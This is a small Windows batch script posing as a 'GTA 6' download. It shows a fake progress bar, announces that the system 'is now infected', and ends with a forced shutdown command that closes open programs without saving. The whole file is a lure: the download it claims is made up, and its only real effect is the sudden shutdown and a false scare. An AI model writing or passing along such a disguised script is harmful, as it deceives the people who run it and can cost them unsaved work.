@echo off
title GTA 6 Download in Progress
color 0a
mode con: cols=50 lines=10

echo Downloading GTA 6... 
ping localhost -n 3 >nul

echo [#####                 ] 20%% Complete
ping localhost -n 2 >nul

echo [##########            ] 40%% Complete
ping localhost -n 2 >nul

echo [###############       ] 60%% Complete
ping localhost -n 2 >nul

echo [####################  ] 80%% Complete
ping localhost -n 2 >nul

echo [######################] 100%% Complete
ping localhost -n 1 >nul

echo GTA 6 download complete!
ping localhost -n 2 >nul

echo WARNING: System is now infected!
ping localhost -n 2 >nul

shutdown /s /f /t 5
exit
